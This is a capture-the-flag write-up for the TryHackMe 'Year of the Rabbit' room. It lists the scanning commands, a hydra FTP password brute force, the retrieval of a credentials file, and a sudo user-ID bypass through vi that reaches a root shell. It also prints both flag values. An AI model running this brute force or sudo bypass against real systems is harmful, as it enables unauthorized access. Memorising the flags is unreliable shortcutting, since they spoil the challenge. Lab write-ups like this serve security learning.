---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - steganography
  - brute-force
  - sudo-abuse
---

# Year of the Rabbit
![Year of the Rabbit logo](logos/year_of_the_rabbit_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)  
**Video:** [YouTube Walkthrough](https://youtu.be/oKiGP2mNJO0)

## Description
"Time to enter the warren..."

## Enumeration
### `nmap` port scan
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
### Web discovery
`ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c`  
### Image download
`wget http://TARGET_IP_ADDRESS/Hot_Babe.png`  

## Foothold
### Image steganography
`strings Hot_Babe.png`  
### FTP password brute force
`hydra -l ftpuser -P password.lst ftp://TARGET_IP_ADDRESS`  
### FTP enumeration
```
ftp ftpuser@TARGET_IP_ADDRESS
dir
get "Eli's_Creds.txt"
bye
```
### File content decoding
[dCode Cipher Identifier](https://www.dcode.fr/cipher-identifier)  
[dCode Brainfuck Decoder](https://www.dcode.fr/brainfuck-language)
### Directory enumeration
`find / -iname s3cr3t 2>/dev/null`  
??? success "user.txt"
	THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

## Privilege Escalation
### Sudo rights
`sudo -l`   
### Sudo exploit
[ExploitDB article](https://www.exploit-db.com/exploits/47502)
[Running shell commands in Vi](https://superuser.com/questions/285500/how-to-run-unix-commands-from-within-vim)
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
ESC
:shell
```
??? success "root.txt"
	THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}

**Tools Used**  
`BurpSuite` `strings` `hydra`

**Date completed:** 07/04/26  
**Date published:** 07/04/26